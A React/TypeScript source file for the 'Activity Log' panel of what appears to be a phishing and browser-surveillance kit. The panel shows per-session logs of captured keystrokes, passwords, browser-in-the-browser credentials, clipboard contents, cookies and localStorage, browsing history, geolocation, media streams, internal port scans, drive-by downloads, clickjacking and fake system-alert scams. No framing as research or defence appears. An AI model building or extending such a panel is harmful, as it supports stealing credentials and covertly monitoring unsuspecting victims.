
'use client';

import { ScrollArea } from '@/components/ui/scroll-area';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Workflow, Keyboard, MousePointer, CaseUpper, FileInput, Monitor, MapPin, Network, Scan, Clipboard, Lock, AlertCircle, History, Download, Eye, Bot, Key } from 'lucide-react';

export type TrackedEvent = {
  sessionId: string;
  type: string;
  data: any;
  timestamp: string;
  url: string;
  userAgent: string;
};

type LiveTrackerProps = {
    sessions: Map<string, TrackedEvent[]>;
    selectedSessionId: string | null;
}

const getEventIcon = (type: TrackedEvent['type']) => {
    switch (type) {
        case 'keystroke': return <Keyboard className="h-4 w-4" />;
        case 'click': return <MousePointer className="h-4 w-4" />;
        case 'form-submit': return <FileInput className="h-4 w-4 text-destructive" />;
        case 'connection': return <Monitor className="h-4 w-4" />;
        case 'media-stream': return <Monitor className="h-4 w-4 text-accent" />;
        case 'location': return <MapPin className="h-4 w-4 text-sky-400" />;
        case 'internal-ip-found': return <Network className="h-4 w-4 text-green-400" />;
        case 'port-scan-result': return <Scan className="h-4 w-4 text-amber-400" />;
        case 'clipboard-read': return <Clipboard className="h-4 w-4 text-purple-400" />;
        case 'bitb-submit': return <Lock className="h-4 w-4 text-destructive" />;
        case 'history-theft': return <History className="h-4 w-4" />;
        case 'drive-by-download': return <Download className="h-4 w-4" />;
        case 'clickjack': return <Eye className="h-4 w-4 text-orange-400" />;
        case 'session-hijack': return <Key className="h-4 w-4 text-red-400" />;
        case 'behavioral-biometrics': return <Bot className="h-4 w-4" />;
        case 'password-field-capture': return <Key className="h-4 w-4 text-destructive" />;
        case 'popup-scam': return <AlertCircle className="h-4 w-4 text-destructive" />;
        default: return <CaseUpper className="h-4 w-4" />;
    }
};

const formatEventData = (event: TrackedEvent) => {
    switch (event.type) {
        case 'connection': return `Session started on ${event.url}`;
        case 'keystroke': return `Key '${event.data.key}' pressed in target <${event.data.target}>`;
        case 'click': return `Clicked on element <${event.data.target}> at (${event.data.x}, ${event.data.y})`;
        case 'form-submit': return `Form submitted with data: ${JSON.stringify(event.data.data)}`;
        case 'media-stream': return `Media stream: ${event.data.type} (${(event.data.size / 1024).toFixed(2)} KB)`;
        case 'location': return `Location captured: Lat ${event.data.latitude?.toFixed(4)}, Lon ${event.data.longitude?.toFixed(4)}`;
        case 'internal-ip-found': return `Internal device found at: ${event.data.ip}`;
        case 'port-scan-result': return `Port scan on ${event.data.target}: Port ${event.data.port} is open`;
        case 'clipboard-read': return `Clipboard content captured: "${event.data.pastedText.substring(0, 50)}..."`;
        case 'bitb-submit': return `BITB credentials captured: ${JSON.stringify(event.data.data)}`;
        case 'history-theft': return `Visited site detected: ${event.data.url}`;
        case 'drive-by-download': return `Triggered auto-download of file: ${event.data.filename}`;
        case 'clickjack': return `Clickjacked to URL: ${event.data.url}`;
        case 'session-hijack': return `Captured session data (cookies, localStorage)`;
        case 'behavioral-biometrics': return `Collected behavioral data: ${event.data.type}`;
        case 'password-field-capture': return `Captured password from field '${event.data.name}'`;
        case 'popup-scam': return `Initiated fake system alert / tab trap.`;
        default: return JSON.stringify(event.data);
    }
};

export function LiveTracker({ sessions, selectedSessionId }: LiveTrackerProps) {
  const selectedSessionEvents = selectedSessionId ? sessions.get(selectedSessionId) || [] : [];
  
  return (
      <Card className="flex-grow flex flex-col">
        <CardHeader>
          <div className="flex justify-between items-center">
            <div>
              <CardTitle className="flex items-center gap-2"><Workflow className="h-5 w-5"/> Activity Log</CardTitle>
              <CardDescription className="truncate">{selectedSessionId || 'No session selected'}</CardDescription>
            </div>
          </div>
        </CardHeader>
        <CardContent className="flex-grow p-2 overflow-hidden">
          <ScrollArea className="h-full w-full bg-primary/10 rounded-md">
             <div className="p-4 font-mono text-xs">
              {selectedSessionEvents.length === 0 ? (
                <div className="flex h-full items-center justify-center text-muted-foreground font-sans min-h-60">
                    {selectedSessionId ? 'No activity recorded for this session yet.' : 'Select a session to begin.'}
                </div>
              ) : (
                selectedSessionEvents.map((event, index) => (
                  <div key={index} className="flex gap-4 items-start mb-2">
                    <div className="text-muted-foreground/60">{new Date(event.timestamp).toLocaleTimeString()}</div>
                    <div className="w-8 shrink-0 flex justify-center text-accent">
                       {getEventIcon(event.type)}
                    </div>
                    <div className="flex-1 text-muted-foreground break-all whitespace-pre-wrap font-sans">
                       {formatEventData(event)}
                    </div>
                  </div>
                ))
              )}
              </div>
          </ScrollArea>
        </CardContent>
      </Card>
  );
}
